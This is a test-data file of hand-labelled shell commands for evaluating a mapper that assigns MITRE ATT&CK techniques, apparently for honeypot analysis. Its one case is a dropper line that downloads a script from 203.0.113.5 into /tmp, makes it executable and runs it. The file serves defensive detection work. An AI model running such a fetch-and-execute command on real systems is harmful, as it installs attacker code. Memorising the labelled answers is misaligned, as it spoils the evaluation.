# Hand-labelled commands for measuring the ATT&CK mapper.
#
# Written independently of mapping/rules.toml (whose own examples test that each rule does what
# its author intended; this file asks whether the mapper agrees with an analyst).
# Policy: `expect` lists every technique an analyst would assign to the command line as typed.
# A payload hidden inside a string that is only written to a file (a cron line) counts when
# running it would clearly be that technique. Commands with nothing to report expect [].
# These are representative of public honeypot playbooks, not captured from this deployment.

[[case]]
command = '''cd /tmp; wget http://203.0.113.5/x.sh; chmod +x x.sh; ./x.sh'''
expect = ["T1105", "T1222.002", "T1059.004"]
note = "classic dropper"

